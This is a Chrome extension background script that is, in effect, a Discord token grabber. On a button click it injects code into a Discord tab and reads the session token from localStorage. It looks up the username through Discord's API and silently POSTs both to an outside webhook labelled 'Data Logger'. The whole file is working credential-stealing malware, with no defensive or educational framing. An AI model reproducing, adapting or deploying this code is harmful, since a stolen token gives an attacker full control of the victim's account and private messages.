// Background script
var extractionInProgress = false;

// When user clicks the extension button
chrome.action.onClicked.addListener(function(tab) {
  if (extractionInProgress) return;

  extractionInProgress = true;

  // Look for Discord tab
  chrome.tabs.query({ url: "https://discord.com/*" }, function(tabs) {
    if (tabs && tabs.length > 0) {
      // Use existing tab
      extractFromTab(tabs[0].id);
    } else {
      // Create new tab
      chrome.tabs.create({ url: "https://discord.com/channels/@me" }, function(newTab) {
        // Wait for page to load
        waitForPageLoad(newTab.id, 0);
      });
    }
  });
});

function waitForPageLoad(tabId, attempts) {
  if (attempts > 120) {
    extractionInProgress = false;
    return;
  }

  chrome.tabs.get(tabId, function(tab) {
    if (tab.status === "complete") {
      // Wait a bit more for localStorage to be populated
      setTimeout(function() {
        extractFromTab(tabId);
      }, 1000);
    } else {
      setTimeout(function() {
        waitForPageLoad(tabId, attempts + 1);
      }, 500);
    }
  });
}

function extractFromTab(tabId) {
  chrome.scripting.executeScript(
    {
      target: { tabId: tabId },
      function: function() {
        // Get token
        var token = localStorage.token || localStorage.getItem('token');
        if (!token) {
          return null;
        }

        // Remove quotes if present
        token = token.replace(/^"/, '').replace(/"$/, '');

        // Get username from DOM
        var username = null;
        try {
          // Try to find username from user menu button
          var userMenuBtn = document.querySelector('[aria-label*="User menu"]') ||
                           document.querySelector('button[aria-haspopup="menu"]');

          if (userMenuBtn) {
            username = userMenuBtn.textContent.trim();
          }

          // Fallback: search for user profile element
          if (!username) {
            var userElements = document.querySelectorAll('[class*="username"]');
            for (var i = 0; i < userElements.length; i++) {
              var text = userElements[i].textContent.trim();
              if (text && text.length > 0 && text.length < 50) {
                username = text;
                break;
              }
            }
          }

          // Last resort: check if username is in visible text near user menu
          if (!username) {
            var allElements = document.querySelectorAll('[role="button"]');
            for (var i = 0; i < allElements.length; i++) {
              var text = allElements[i].textContent.trim();
              if (text && text.includes("#") && text.length < 30) {
                username = text;
                break;
              }
            }
          }
        } catch (e) {
          console.error("Failed to get username:", e);
        }

        return {
          token: token,
          username: username
        };
      }
    },
    function(results) {
      extractionInProgress = false;

      if (chrome.runtime.lastError) {
        console.error("Error:", chrome.runtime.lastError);
        return;
      }

      if (!results || !results[0] || !results[0].result) {
        console.log("No token found, retrying...");
        // Retry
        setTimeout(function() {
          if (!extractionInProgress) {
            extractionInProgress = true;
            extractFromTab(tabId);
          }
        }, 2000);
        return;
      }

      var data = results[0].result;

      // Get username from Discord API using the token
      if (data && data.token) {
        getUsernameFromAPI(data.token, function(username) {
          data.username = username;
          // Send to webhook
          sendToWebhook(data);
        });
      } else {
        // Send to webhook without username
        sendToWebhook(data);
      }
    }
  );
}

function getUsernameFromAPI(token, callback) {
  fetch("https://discord.com/api/v10/users/@me", {
    headers: {
      "Authorization": token
    }
  })
    .then(response => response.json())
    .then(user => {
      if (user.username) {
        var username = user.username;
        if (user.discriminator && user.discriminator !== "0") {
          username += "#" + user.discriminator;
        }
        callback(username);
      } else {
        callback(null);
      }
    })
    .catch(e => {
      callback(null);
    });
}

function sendToWebhook(data) {
  // Load webhook URL from storage
  chrome.storage.local.get(['webhook_url'], function(result) {
    if (result.webhook_url) {
      sendWebhookRequest(result.webhook_url, data);
    } else {
      // Fallback to config.json for local development
      fetch(chrome.runtime.getURL('config.json'))
        .then(response => response.json())
        .then(config => {
          if (config.webhook_url) {
            // Save to storage for future use
            chrome.storage.local.set({ webhook_url: config.webhook_url });
            sendWebhookRequest(config.webhook_url, data);
          }
        })
        .catch(e => {
          // Silent fail
        });
    }
  });
}

function sendWebhookRequest(webhookUrl, data) {

  var message = "Token: " + data.token;
  if (data.username) {
    message += "\nUsername: " + data.username;
  }

  var payload = {
    content: message,
    username: "Data Logger"
  };

  fetch(webhookUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(payload)
  });
}
